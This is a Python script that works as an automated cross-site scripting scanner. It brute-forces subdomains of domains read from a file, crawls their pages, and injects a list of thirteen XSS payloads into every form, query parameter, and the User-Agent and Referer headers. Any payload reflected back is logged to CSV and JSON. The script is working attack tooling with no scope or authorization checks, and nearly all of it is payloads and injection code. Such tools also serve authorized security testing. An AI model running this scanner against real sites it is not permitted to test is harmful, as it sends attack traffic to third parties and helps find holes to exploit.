import requests
from bs4 import BeautifulSoup
import urllib.parse
import csv
import json
import time
import os

# Enhanced list of XSS payloads (13 in total)
payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<math><mtext><![CDATA[<script>alert('XSS')</script>]]></mtext></math>",
    "<body onload=alert('XSS')>",
    "<div style=\"background-image: url(javascript:alert('XSS'))\"></div>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\"></embed>",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<form action=\"javascript:alert('XSS')\"><input type=\"submit\"></form>"
]

visited_urls = set()
subdomains = set()

# Subdomain brute-force list (expand as needed)
subdomain_list = ['www', 'blog', 'mail', 'admin', 'test', 'shop', 'support', 'dev', 'api', 'forum']

# Initialize CSV and JSON files
csv_file = "results.csv"
json_file = "results.json"

def log_to_csv(data):
    with open(csv_file, mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(data)

def log_to_json(data):
    with open(json_file, mode='a', encoding='utf-8') as file:
        json.dump(data, file)
        file.write('\n')

# Function to read domains from a text file
def read_domains(file_path):
    if not os.path.exists(file_path):
        print(f"Domain file {file_path} does not exist.")
        return []
    with open(file_path, 'r') as file:
        domains = [line.strip() for line in file if line.strip()]
    return domains

# Subdomain enumeration (brute-force common subdomains)
def enumerate_subdomains(domain):
    print(f"Enumerating subdomains for {domain}...")
    for sub in subdomain_list:
        subdomain_url = f"http://{sub}.{domain}"
        try:
            response = requests.get(subdomain_url, timeout=5)
            if response.status_code == 200:
                print(f"Discovered subdomain: {subdomain_url}")
                subdomains.add(subdomain_url)
        except requests.RequestException:
            pass  # If a subdomain doesn't exist or is unreachable, skip it

# Crawl function to recursively go through pages and test injection points
def crawl(url, domain):
    if url in visited_urls:
        return
    visited_urls.add(url)

    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"Crawling: {url}")
            soup = BeautifulSoup(response.content, 'html.parser')

            # Inject payloads into forms
            inject_in_forms(url, soup)

            # Inject payloads into query parameters
            inject_in_query_params(url)

            # Inject payloads into headers
            inject_in_headers(url)

            # Extract and follow internal links
            for link in soup.find_all('a', href=True):
                new_url = urllib.parse.urljoin(url, link['href'])
                parsed_new_url = urllib.parse.urlparse(new_url)
                new_domain = parsed_new_url.netloc
                if domain in new_domain and new_url not in visited_urls:
                    crawl(new_url, domain)

    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

# Inject payloads into forms on the page
def inject_in_forms(url, soup):
    forms = soup.find_all('form')
    for form in forms:
        form_action = form.get('action')
        form_method = form.get('method', 'get').lower()

        inputs = form.find_all('input')
        form_data = {input.get('name'): input.get('value', '') for input in inputs if input.get('name')}

        for payload in payloads:
            for input_name in form_data:
                form_data[input_name] = payload

            action_url = urllib.parse.urljoin(url, form_action) if form_action else url

            try:
                if form_method == 'post':
                    response = requests.post(action_url, data=form_data, timeout=10)
                else:
                    response = requests.get(action_url, params=form_data, timeout=10)

                if payload in response.text:
                    print(f"[!] Possible XSS in form on {url} with payload: {payload}")
                    log_data = {
                        "url": action_url,
                        "payload": payload,
                        "vulnerability_type": "XSS in Form",
                        "response_status": response.status_code,
                        "response_snippet": response.text[:200],
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
                    }
                    log_to_csv([action_url, payload, "XSS in Form", response.status_code, response.text[:200], time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())])
                    log_to_json(log_data)

            except requests.RequestException as e:
                print(f"Error submitting form on {url}: {e}")
                log_data = {
                    "url": action_url,
                    "payload": payload,
                    "vulnerability_type": "Form Submission Error",
                    "response_status": None,
                    "response_snippet": str(e),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
                }
                log_to_csv([action_url, payload, "Form Submission Error", "N/A", str(e), time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())])
                log_to_json(log_data)

# Inject payloads into query parameters (URL injection)
def inject_in_query_params(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)

    if not query_params:
        return  # No query parameters to inject

    for payload in payloads:
        modified_query = {key: [payload] for key in query_params}
        new_query = urllib.parse.urlencode(modified_query, doseq=True)
        new_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

        try:
            response = requests.get(new_url, timeout=10)

            if payload in response.text:
                print(f"[!] Possible XSS in query parameter on {new_url} with payload: {payload}")
                log_data = {
                    "url": new_url,
                    "payload": payload,
                    "vulnerability_type": "XSS in Query Parameter",
                    "response_status": response.status_code,
                    "response_snippet": response.text[:200],
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
                }
                log_to_csv([new_url, payload, "XSS in Query Parameter", response.status_code, response.text[:200], time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())])
                log_to_json(log_data)

        except requests.RequestException as e:
            print(f"Error injecting into query params on {url}: {e}")
            log_data = {
                "url": new_url,
                "payload": payload,
                "vulnerability_type": "Query Parameter Injection Error",
                "response_status": None,
                "response_snippet": str(e),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            }
            log_to_csv([new_url, payload, "Query Parameter Injection Error", "N/A", str(e), time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())])
            log_to_json(log_data)

# Inject payloads into HTTP headers (like User-Agent, Referer, etc.)
def inject_in_headers(url):
    headers = {
        "User-Agent": "<script>alert('XSS')</script>",
        "Referer": "'><script>alert('XSS')</script>"
    }

    try:
        response = requests.get(url, headers=headers, timeout=10)

        if headers["User-Agent"] in response.text or headers["Referer"] in response.text:
            print(f"[!] Possible XSS via headers on {url}")
            log_data = {
                "url": url,
                "payload": "Headers",
                "vulnerability_type": "XSS via Headers",
                "response_status": response.status_code,
                "response_snippet": response.text[:200],
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            }
            log_to_csv([url, "Headers", "XSS via Headers", response.status_code, response.text[:200], time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())])
            log_to_json(log_data)

    except requests.RequestException as e:
        print(f"Error injecting headers on {url}: {e}")
        log_data = {
            "url": url,
            "payload": "Headers",
            "vulnerability_type": "Header Injection Error",
            "response_status": None,
            "response_snippet": str(e),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
        }
        log_to_csv([url, "Headers", "Header Injection Error", "N/A", str(e), time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())])
        log_to_json(log_data)

# Main function to run the script
if __name__ == "__main__":
    # Check if the domain list file exists
    domain_file = "domains.txt"
    if not os.path.exists(domain_file):
        print(f"Domain file '{domain_file}' not found. Please create a file with one domain per line.")
        exit(1)

    # Read domains from the text file
    domains = read_domains(domain_file)
    if not domains:
        print("No domains to scan. Please add domains to 'domains.txt'.")
        exit(1)

    # Initialize CSV with headers
    with open(csv_file, mode='w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["URL", "Payload", "Vulnerability Type", "Response Status", "Response Snippet", "Timestamp"])

    # Enumerate subdomains and crawl each domain and its subdomains
    for domain in domains:
        enumerate_subdomains(domain)
        main_domain_url = f"http://{domain}"
        subdomains.add(main_domain_url)  # Add the main domain to the subdomains set

    # Crawl all discovered subdomains
    for subdomain in subdomains:
        crawl(subdomain, urllib.parse.urlparse(subdomain).netloc)

    print("Crawling completed. Check 'results.csv' and 'results.json' for potential vulnerabilities.")
